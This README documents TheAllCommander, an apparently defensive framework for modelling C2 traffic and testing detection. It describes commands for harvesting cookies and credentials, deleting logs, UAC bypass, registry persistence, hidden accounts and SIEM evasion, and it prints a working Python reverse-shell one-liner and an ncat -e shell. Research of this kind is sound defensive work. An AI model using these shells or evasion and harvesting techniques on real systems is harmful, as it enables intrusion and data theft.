[![Codacy Badge](https://app.codacy.com/project/badge/Grade/8841eabd9ba243ffacd9dc084dbfa3b1)](https://app.codacy.com/gh/matt-handy/TheAllCommander/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)

# TheAllCommander
Framework for modeling and researching C2 communications for developing efficient filtering and detection logic.

The All Commander 2.0 released January 2024 contains major new features, see [Change Log](Changelog.md)

Featured in DEFCON Demolabs 2022!!!!

Development blog: http://matthandy.net/TAC-development.html

# Why TheAllCommander?
TheAllCommander allows researchers to easily develop their own communication modules and connect them to this framework, then leverage the existing framework to test elements of the Red Team workflow through the communication protocol for further study. 
## What TheAllCommander is...
A flexible framework for studying, modeling, and testing new C2 communication protocols.

A portable framework for executing tests of an environments ability to detect non-nominal C2 traffic.

A robust framework that allows simulation of an attacker's Tools Techniques and Procedures (TTPs) while providing direct mitigation and detection suggestions for augmenting a SIEM.
   
## What TheAllCommander is not...
TheAllCommander does not natively sling exploits - this is not trying to be Metasploit.
TheAllCommander does not provide malware agents for use in an engagement - this is not trying to be Cobalt Strike. 
	Note: TheAllCommander daemon announces itself with a warning in the Windows Event Log. It is <em>not</em> intended for red team engagements.

# Concept of Operations
The central server, TheAllCommander, receives incoming connections on a variety of communications protocols. Current, it supports HTTP, HTTPS, Email, text over TCP, and UDP (DNS traffic emulation). This allows for a single server to control local daemons over any of those protocols. TheAllCommander can be controlled from either a LocalConnection terminal based interface or TheAllCommanderFE, an Angular application developed to allow a GUI for inputing commands. All commands, listed below, are translated by TheAllCommander into a platform specific format if needed, and then transmitted to the local daemon. 

Daemons are uniquely identified by the combination of user account, hostname, and protocol. Therefore multiple daemons can exist on a target system via different protocols, or via different user permission levels. It is also possible to spawn a daemon that identifies itself with a UID, which is specified as a unique identifier consisting of 16 alphanumeric characters. If a UID is specified for the daemon, the server will check to see if there is a prior session for the daemon's combination of hostname, user id, and protocol. If there is such a session, but the other daemon has not been in contact with the server within the configurable expected contact time, then the new daemon will assume the session of the previous one. However, if the other session is still active, then the server will allow both sessions to exist simultaneously. See the HTTPS handler reference implementation for details.

# Defense Recommendations
TheAllCommander has an evolving guide for detection of as many client side indicators of compromise emulated by this tool as possible. It can be found here: [Blue Team Guide](blue_team/IOC_Guide.md) 

# Interfaces
Check out the [Developers Guide](DevelopersGuide.md)

There are several key classes which are described in detail in the Javadoc for this project.

At a high level, this is the user-implementable part of the workflow: To communicate with a remote agent/exploit/etc, TheAllCommander defines an abstract class c2.C2Interface. It also implements Runnable, where the programmer will implement whatever operations are necessary to initialize communications. Communiation with the rest of TheAllCommander is facilitated with the IOManager class, which is a thread safe vehicle passed to the C2 interface on initialization. The C2Interface instance can request commands relevant to connect clients from this class, as well as pass along return communications. TheAllCommander handles routing those communications to the controlling agent.

There is also an AbstractCommandMacro class which can accept commands and translate them to more complex instructions. For example, TheAllCommander comes with two macro sets out of the box. The first of these is the CookieDeletionMacro, which allows the user to simply state the command "delete_cookies". The CookieDeletionMacro will then decompose this instruction into a series of instructions that delete Firefox, Chrome, and Edge cookies for the current user session on the target system. There is also the "harvest_cookies" macro, which instructs the remote daemon to send Firefox, Chrome, and Edge cookies to TheAllCommander.

# Daemons
Currently, TheAllCommander has been tested with the following payloads:

1) Python. Currently TheAllCommander includes a HTTPS, UDP/DNS, and EMail emulation daemon. These daemons are in no way produced for operations in a real Red Team engagement, and are developed to serve as a template for further comm development. Both demonstrate use of these communication protocols in a comparable way.
		Note: The email daemon is Windows specific and has not yet been ported to Linux. 

2) Text over tcp reverse shells

	a) Msfvenom unstaged tcp payloads (windows/x64/shell_reverse_tcp and linux/x86/shell_reverse_tcp)

	b) "Python oneliner" ->  TheAllCommander can receive connections from python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'
		Note: This has been tested with /bin/sh and the $ will be removed to normalize IO with a Linux ncat shell

	c) ncat <ip> <port> -e cmd | /bin/bash -> works on both Linux and Windows

	d) Powershell native text over tcp reverse shells

3) TheAllCommander has been augmented with the ability to parse C# code and serve it to a C# stager. At present, only a harmless "Hello World" example is provided to demonstrate client-side indicators of compromise. See "C# Staging" below.

4) A Java code parser and stager has been added alongside C#. While most active tradecraft for Windows using this sort of staged attack in a self-compiling language is focused on C#, the lack of focus on Java introduces a number of opportunities.

5) C++, C# and Java daemons with limited functionality exist that interoperate with the server framework, designed to generate IOCs related to tradecraft techniques related to use of these languages in certain red team strategies. However, useful Blue Team mitigations have not yet been developed, which is a goal of this project. They will be publicly released outside the collaborative team when a reliable method for Blue Team detection is developed.   
 

# Commands
The following commands are supported in the default protocol test daemon:

ps - List all running process

pwd - Print Working Directory

getuid - prints username, user directory, and hostname

uplink (filename) - returns a file from the remote host in base64. TheAllCommanderFE will automatically allow download of the file.

<control> download (filename) (base64 file binary) - downloads file to remote host. TheAllCommanderFE allows users to select a file from the GUI and it will be automatically transferred to the daemon.

cd (directory) - changes present directory

die - Local daemon closes

screenshot (No Linux/Mac support) - Captures a screenshot, and uploads to the HARVEST directory based on hostname\username\time-tagged-file

clipboard (No Linux/Mac support) - captures the clipboard contents and uploads the contents to the HARVEST directory based on hostname-pid-username folder

cat
 
	cat (filename) - reads files
	
	cat >(filename) - writes to file, overwriting. each line entered builds a string, then committed to the file. <done> to close, <cancel> to cancel operation
	
	cat >>(filename) - same as ">", except appends to file
	
	cat (file) > (file2) - copies file to file2, overwriting content
	
	cat (file) >> (file2) - appends file to file2
	 
proxy <Remote IP> <port> <local port>

	This command binds a TCP listener to <local port> on the TheAllCommander's command server. The remote daemon will
	open a socket to host <Remote IP> at <port>, and will function as a TCP proxy. This mode is currently supported for 
	HTTP, DNS, and email clients.
	Note: The proxy only supports IPv4 at this time, and using "localhost" may resolve to an IPv6 loopback. Use 127.0.0.1 instead
	
killproxy <Remote IP> <port>

	Terminates the associated proxy on the server and client
	
confirm_client_proxy <ip>:<port>

	Responds with "yes" or "no" depending on if a proxy is running on the daemon
	
harvest_pwd

	Uploads all files and directories, recursively, from the pwd of the daemon. Works on Python implementation. Currently
	this implementation is rudamentary and uses a simple TCP socket, but will evolve to model more sophisticated attacks for
	robust detection testing.
	
	New with 2.0 - expanded functionality to include text-only channels
	
kill_all_harvests

	Terminates all currently open harvest operations
	
listActiveHarvests

	Lists with an index all currently active harvests
	
kill_harvest <index>

	Supplied with an index from "listActiveHarvests", this command kills a specific directory harvest		

## Command Obfuscation Modes

###Powershell obfuscation
When this mode is active, commands entered will be treated as literal powershell commands and transmitted in an evasive way to evade trivial logging. "Get-Date" will become "ECHO Get-Date | powershell". This is functionally is equivalent in execution to powershell -c "Get-Date", except it will evade trivial logging. This mode can be enabled with "<ps-start>" and disabled with "<ps-end>"

###Windows command line obfuscation
Windows command line will ignore "^" characters and execute a command as normal. For example, "n^et user evil_haxor hax123 /add" will add the evil_haxor user, while a SIEM rule looking for commands that include the "net" command literal will be defeated. Note that TheAllCommander will recognize when a user is attempting to run commands like "cd" or server side macros and will not alter these commands. This mode can be engaged as follows:

&lt;esc> -> Prepend any command with "<esc> " to have TheAllCommander insert random ^ characters to demonstrate Windows cmd

&lt;start esc> -> All commands send will include random ^ characters. Does not affect server side macro commands

&lt;end esc> -> Return to normal operations
 

## Shells
To enable more complicated modeling that involve parallel execution of tasks and to facilitate interaction with command line utilities that require multiple line interactions, TheAllCommander can launch child shells, which can be placed in the background. The following commands are available:

shell 
	
	Launches a new shell and begins control flow within that shell. Returns to the user a string indicating the current shell ID.
	
shell_background
	
	Places the current shell in the background. When the shell is in the background, execution of the process continues. Messages from stderr and stdout are cached until control flow is returned to the shell.
	
shell <integer ID>

	Resumes control flow with the specified shell
	
shell_kill

	Destroys the current shell
	
shell_kill <integer ID>

	Destroys the child shell indicated					 	

## Server based macro commands
The following commands are implemented serverside, where the server translates the instructions into
commands for the daemon. Most of these commands are intended to trigger client side indicators of compromise to assist with threat mimicry and modeling. 

The command "list_macros" will list all macros loaded to the server.

spawn_fodhelper_elevated_session

	This macro is designed to enable testing of client-side defenses around the fodhelper user access control defenses. This macro functions by asking the connected daemon for information on how it can be started (IE - an executable name, script path, etc), and will then set the required registry keys for fodhelper to launch a new copy of the daemon. Fodhelper will then be engaged, returning a second session with elevated privileges. At this time, TheAllCommander doesn't support seamless session integration with the elevated session, as this is a red team feature and not needed for indicator of compromise modeling. 
	Note: Windows defender automatically intercepts the following daemon launch mechanisms: any python script, any command beginning with cmd.exe and any command beginning with powershell.exe. Stand-alone binaries which do not register as malware may be launched, and there is value in doing additional indicator of compromise modeling and heuristic analysis on behavior of these daemons after launch.
	Future work: Defender will intercept and delete the fodhelper registry key for a python script which is added, however it is slow enough to do so only after the daemon has a chance to launch fodhelper. Some sort of supplemental monitoring to augment defender is necessary for maximum protection, study future mitigation options.
	
clean_fodhelper

	This macro is designed to clean up the registry key set by the spawn_fodhelper_elevated_session macro

delete_windows_logs <all | application | security | system | setup>

	This server side macro is used for generating and testing client side indicators of compromise. Malware will often attempt to cleanup by deleting Windows event logs. This macro will cause the connected daemon session to clear the windows event log using the wevtutil utility. It requires elevated privileges to execute. Note: This function actually deletes the targeted Windows logs, so only use on an appropriate test system.
	Future work: develop more comprehensive indicator of compromise generator by compromising the logs via multiple techniques.

delete_cookies

	deletes cookies for Firefox, Edge (Chromium version), and Chrome on Windows. This is a common tactic for malware, as it forces the end-user to re-enter crediential information. This function will generate an access signature mimicing this attack pattern. NOTE: It does so by actually deleting those files, so use this on a test platform with non-operational users. 
		
harvest_cookies

	takes copies of cookies for Firefox, Edge (Chromium) and Chrome on Windows. Takes a copy of Firefox credential files. This should effectively generate a file access signature for validating rules that monitor controls on these sensitive files.

activate_rdp <username>

	sets up Remote Desktop access on windows platforms, only supported by C++ daemons at present (public release pending). This feature was originally implemented using a dropper which would place Chisel on the target system and utilize it for the port tunneling. However, as A/V products are good at finding chisel at the endpoint, this doesn't make for a particularly interesting scenario to model. The implementation has switched to using TheAllCommander's own TCP tunneling, which should emulate a much more instructive threat model. 

startSocks5 <port>

	This command starts a SOCKS5 proxy on TheAllCommander which receives connect requests on the specified port. As new connections come in, the connected daemon will forward those incoming connections. This allows for tunneled network traffic, similar to the equivalent Meterpreter functionality.

empty_recycle_bin

	This command deletes the recycle bin contents for the user with the current session to generate a client side indicator of compromise.

harvest_user_dir

	This command initiates an automatic harvest of Windows Desktop and Documents directories and Linux home directories, depending on the host
	
harvest_outlook (basic | deep)

	This command with the "basic" argument will harvest the default .pst and .ost files used by Outlook. In "deep" mode, the tool will search for a non-standard .pst location and harvest it.

regkey_persist (lm | cu) (calc - optional)

	This command will use either the local machine (lm) or current user (cu) startup registry key to start the daemon process on next startup. To simulate an attempt to write to these keys without invoking the daemon on startup, the optional third argument "calc" can be used to configure the system to launch calc.exe on startup. This provides more flexibility in environments where the actual test daemon cannot be given actual persistence to stay within the test boundaries.

reg_debugger <process name>

	This command will use the Windows Local Machine registry key for process debugging to launch the daemon process instead whenever the target process is executed. This is not a stealthy technique, but attackers sometimes use it and it deserves robust detection. Requires an elevated session.

reg_silent_exit <process name>

	This command will use the Windows SilentProcessExit registry key to launch the daemon process when the target process is closed. This is a reasonably stealthy technique if the attacker uses it skillfully in terms of user awareness. Requires an elevated session.

add_hidden_user <optional - username> <optional - password>

	This command, with no arguments, will generate a random user string and password, with the final character being '$' and creates the account via the Win32 API and with the UF_WORKSTATION_TRUST_ACCOUNT flag. This makes the user account unseen by "net user", so it is more stealthy and the baseline user creation techniques. If invoked with one argument, it will use the argument as the password. The user can also specify a username without the trailing '$'. TheAllCommander will honor that username, however it will post a warning. This feature is inspired by https://github.com/Ben0xA/DoUCMe  
	
### Enumeration

enum_av

	This command uses WMIC to enumerate AV products on Windows
	
enum_network_share

	This command uses WMIC to enumerate network shares on Windows
	
enum_patches <wmic | ps>

	This command uses WMIC or Powershell to enumerate patch level on Windows	

enumerate_users

	This command will enumerate the users present on the system and the domain. If domain access is present, groups are enumerated as well.

	
# Near Term Project Goals

DNSEmulatorSubdomainComms currently implements traffic hiding within DNS using the tried and true technique of hiding base64 communication in the subdomain, such as <secret message>.domain.com, with responses returned in DNS TXT records. In the future, I will be implementing a novel protocol which is less obvious to provide modelling for less trivial heuristic detection.  

The project currently supports a very basic set of IOC detection recommendations. My goal is to augment this suite to provide robust detection of more IOCs, as well as more recommendations for protection of common data assets.

# Default Commands

Sometimes it is desirable for daemons to automatically execute commands without human interaction on connecting for the first time with the home server. The configuration file element "hub.cmd.defaults" can be used to specify a file that contains commands to be sent automatically. There are several tags, and an example is included the "test" directory. This functionality is controlled with the configuration flag:
hub.cmd.defaults=test\\default_commands

The tags within the default commands file are as follows. The tag proceeds commands which will be executed.

:all -> Applies to all daemons connecting

:user-<username> -> Applies to all users matching this username. For example, all Administrator sessions might wish to execute higher level persistence establishment

:hostname-<hostname> -> Applies to all daemons on a host. Useful if there is some steps necessary to enable commanding on a particular

# Configuration
The execCentral.bar script provides a properties file. Most of the values in this properties file do not need to be changed, however they all the user an enormous level of freedom to modify many elements of TheAllCommander's function. Key configuration elements are listed below:

commander.port.secure=8012		Port for TLS secured commander sessions

commander.username.1=admin		Administrator username. In the future a more flexible user management system will implemented.

commander.secret.1=changeme		Administrator password. In the future a more flexible and secure system will implemented.

daemon.port=8000 				HTTPS port

daemon.dns.port=8001			DNS/UDP emulation port

daemon.http.port=8002			HTTP port

daemon.nativeshell.port=8003	Port for text over TCP port. A single receiver is used for all text over TCP, 
								TheAllCommander dynamically detects what response is needed

daemon.lz.logger=test			This is the location the keylogger information is sent to

daemon.lz.exfil=exfil			This directory is used for wide net data exfiltration

daemon.lz.harvest=test			Harvested information, such as clipboard shots, are saved here

The following configuration elements are used to connect to an email server to send commands and receive responses

daemon.email.port=587			

daemon.email.host=mail.<somewhere>

daemon.email.username=testC2@<somewhere>

daemon.email.password=<password>

When TheAllCommander sends multiple commands automatically behind the scenes to accomplish a function, it will detect error conditions at each step of this process. This is the maximum time in milliseconds that it will wait for an affirmative response. Depending on the communication mechanism used, a greater than default value might be needed

daemon.maxresponsewait=15000

The following two parameters are used to configure how often TheAllCommander checks for new text over a socket and should not need to be changed. 

daemon.responserepollinterval=500

daemon.textovertcpstaticwait=500

The "commservices" parameter accepts a comma separated list of fully qualified class names for classes that extend the abstract class c2.C2Interface. This allows the software to dynamically load any arbitrary communication protocol the user wishes to implement and supply to the framework. 

commservices=c2.http.HTTPSManager,c2.udp.DNSEmulatorSubdomainComms,c2.smtp.EmailHandler,c2.tcp.GenericTCPInitiator

NOTE: DNSEndpointEmulator was the original implementation of the DNS faking protocol. It has been deprecated for the less obvious DNSEmulatorSubdomainComms. dnsAgent.py is the associated original daemon, and both will be removed in subsequent releases.

The "macros" parameter accepts a comma separated list of fully qualified class names for classes that extend the AbstractCommandMacro class, which allows users to define their own complex single line commands, which TheAllCommander can the translate into discrete commands. 

macros=c2.session.macro.CookieDeletionMacro,c2.session.macro.CookieHarvesterMacro

The following configuration elements are used to toggle the use of encrypting the payload for DNS/UDP emulated traffic

wire.encrypt.toggle=true

wire.encrypt.key=AQIDBAUGBwgJCgsMDQ4PEA==

daemon.reportinginterval.expectedmaxclient

daemon.reportinginterval.multiplesexpectedmaxclient

# C# Staging

C# code can compile and run other C# code at runtime. This gives malware developers the ability to write small stagers, which then pull from a remote source the "real" malware. To model for this sort procedure, TheAllCommander can automatically generate one of these stagers. The first stage is generated from the text line interface to TheAllCommander, with the commands shown below. The server will then assemble the payload to transmit. It will use a headers file to pre-pend all the C# declarations needed, followed by a concatenated set of source files. The stager will receive these source files, compile them in real time, and then execute the stager.

In terms of indicators of compromise, this will write a temporary file to disk. This provides defender or other antivirus solutions the opportunity to inspect the executable contents before they are run. However, I think there is additional opportunity to detect the staging logic itself, which is the motivation behind creating this feature. As I research this further and develop mitigation strategies, I'll be documenting these findings.

To configure the header file within the csharp_payload directory, please use the parameter "daemon.payload.csharp.masterimport=headers"

To change the default served payload, please use the parameter "daemon.payload.csharp.filelist=HelloWorld.cs"  

From the text client for TheAllCommander, please select the "WIZARD" option when prompted on startup. The commands to create either a text stager or a pre-compiled stager will be printed there in a help menu. Dynamic obfuscation of the file is available, please follow the Wizard prompts to enable.
	Note: The stager is only compiled for the user by TheAllCommander server if the server is run on Windows.
	
The C# stager by default is generated with random code permutations. To disable this, please see the WIZARD help options for syntax.

# Java Staging
Java code can compile and run other Java code at runtime, and can be used by malicious actors with the same purpose as C#. While the concept is similar to C#, the executions is different. In the case of C#, the client loads a complete code base and then loads compiles it. However, with Java the local code loads a remote jar into memory, and then executes the code in memory. As with C#, the code is never written to disk and therefore is more likely to evade antivirus.

First, the user will generate a jar file containing a program with a main method, as with a normal Java program. This jar file is then hosted from a web server at a location the target client can reach.

Second, client code which will download the jar and execute that code is generated by TheAllCommander. From the command line wizard, use the command "generate_java". The first argument is the name of the Main class of the previous Java jar file. The second through "n" arguments are a list of jar files to be loaded. For example, "generate_java localhost:8010 HelloWorld HelloWorld.jar Other.jar".

Finally, TheAllCommander will download an executable jar file that can be executed on the client to run the payload jar. There is a "HelloWorld" jar file included under "agents/HelloWorld/java"

# Dependencies
Java JDK

Maven

Python 3.10 or greater -> ensure that both the Python and scripts directory are on your path (%APPDATA%\Local\Programs\Python\Python310 and %APPDATA%\Local\Programs\Python\Python310\Scripts by default)

Note: Python 3.11 or great is required for Mac support.

## Python Daemon Dependencies
pip install keyboard

pip install pyautogui

pip install Pillow

pip install pywin32

pip install pycryptodome


# Building & Running
TheAllCommander server is tested to build and work on both Windows, Linux, and Mac. The python daemons are developed primarily to demonstrate indicators of compromise on Windows hosts, and as such the keylogger and clipboard capture functionality does not work on Linux. However, the daemon will load and run, managing imports on an operating system dependent basis. 

1) There should be a keystore.jks file (by default nomenclature, changeable in test.properties for Windows and test_linux.properties for Linux and Mac) in the config directory. To generate one, use the following command to leverage the Java keytool program: keytool -genkey -alias server-alias -keyalg RSA -keypass password -storepass password -keystore keystore.jks

NOTE: Mvn test will run tests of the HTTPS server, so there must be a keystore file to ensure that certificates can load before all build tests will pass

2) TheAllCommander is set up as a maven project, so a simple "mvn install -DskipTests" will build the project and resolve all dependencies in the the "target" folder. 

NOTE: If mvn is run to execute unit tests, both TheAllCommander and the sample HTTPS daemon will be started. The file located at test/test.properties contains configuration for test execution. If TheAllCommander is being tested on Linux, the areas highlighted in that file with Linux-variant commands must be switched to their Linux variant. By default, it will build on Windows without modification to this file. Running the tests will take several minutes. 

NOTE: The test sequence, when run on Windows, will validate that the expected browser cookie location is still legitimate. To do this, Firefox, Chrome, and Edge must be installed. If these browsers are not installed, skip test execution on Windows.

3) execCentral.bat is a script which will launch TheAllCommander server using, by default, the configuration file config/test.properties. Please modify this configuration file with the desired configurations, or update the script to point to a custom configuration file. By default, TheAllCommander will connect to the server with a TLS session as of version 2.0.1, however and unencrpted connection is available, though support is deprecated. 

4) To control TheAllCommander, execCommander.bat will launch a text client, which by default will connect to the locally running instance of TheAllCommander. There is a related project, TheAllCommanderFE which provides a very simply Angular front end for TheAllCommander, which is designed to function entirely independently. Note: execCommander.bat's simply local client will prompt the user for a session to choose. This session must be chosen quickly or the connection will time out.   

5) Launch a sample daemon. From agents\python -> python httpsAgent.py

Note: TheAllCommander's default test.properties file comes with email daemon monitoring disabled for convenience, since test users are less likely to have access to a test email server. To re-enable, add the following lines to the the test.properties file:
daemon.email.port=587
daemon.email.host=mail.matthandy.net
daemon.email.username=testC2@matthandy.net
daemon.email.password=REPLACE ME!!!!

and update the comm services line to include the email service, as follows:

commservices=c2.http.HTTPSManager,c2.udp.DNSEndpointEmulator,c2.smtp.EmailHandler,c2.tcp.GenericTCPInitiator

Note also that the test daemon "emailAgent.py" has placeholder values for the email server which must be filled in

# Test
There are two classes of test for TheAllCommander. One is the standard unit tests, which test TheAllCommander's core java code by itself. These tests can be run with "mvn test" 

The second, and far more comprehensive, test suite is included in the integration_test directory. These tests are orchestrated through junit, but involve TheAllCommander server being started in its entirety, and one of the test daemons being engaged to run through a standard set of test sequences. This tests both the server and the daemons in an apples-to-apples manner.
NOTE: Currently automated cross platform testing with Linux requires supplemental software which has not yet been documented. Documentation for automated Linux functional testing is pending. 

Note: There is a default_commands file under "test" which contains the load script for automatic commands, or commands which are executed against a daemon immediately on connection. They are set to a default username and hostname and must be updated if that test will pass.

NOTE: Automated testing of the outlook harvester macro is disabled by default, and can be activated by setting outlookharvest.live.enable=true in the the test_config.properties file. This is disabled by default since some users are building and testing on production laptops with actual Outlook data, and therefore we want users to opt in to that test. The test starts a local daemon and a local TheAllCommander instance, and ensures that Outlook data is correctly processed by the local instance.

#Code Quality
TBD

#Contributing
Looking to contribute? There are a few work items in the queue that would be great help with!

1) SOCKS5 proxy support doesn't currently extend to Linux and Mac, lets add it!

2) The SOCKS5 testHTTPSBrokenConnections and its DNS equivalent fail in automated testing, but work when executed manually.
 
3) Edge cookie harvesting doesn't currently work - it seems Windows keeps a lock on the file even when Edge is not in use

4) Create a keylogger implementation for Mac and Linux with Python, C++, and Java daemons

5) Support basic port forward on Mac and Linux demonstrate on C++, Java, and Python

6) Suspect there is an intermittent bug in communication with the DNS implementation - C++ DNS daemon doesn't work regularly with test. DNS doesn't work well with Linux/Mac and fails regularly

7) PythonEmailAllCommandsTest and RunnerTestKeyloggerEmail currently disabled, will not run to completion. Suspect stability of mail server

8) C# email test daemon will not run to completion.

9) Implement current DNS protocol for C# daemon

10) Add Where command support for C# and Java daemons

11) The following commands don't work with the current SMB protocol: where, cat multiline, and shell